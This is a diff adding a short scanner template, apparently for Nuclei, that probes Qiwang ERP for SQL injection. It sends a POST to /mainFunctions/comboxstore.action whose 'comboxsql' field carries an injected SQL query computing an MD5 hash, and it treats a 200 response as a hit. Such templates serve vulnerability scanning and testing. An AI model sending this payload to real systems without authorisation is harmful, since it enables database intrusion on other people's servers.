@@ -1,0 +1,21 @@
+id: yaml-poc-wantit-qiwang_erp-sql_injection-CT-479107
+info:
+  name: Yaml Poc Wantit Qiwang_Erp Sql_Injection Ct 479107
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-wantit-qiwang_erp-sql_injection-CT-479107'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /mainFunctions/comboxstore.action
+  body: comboxsql=select HashBytes('MD5', '{{s2}}')
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
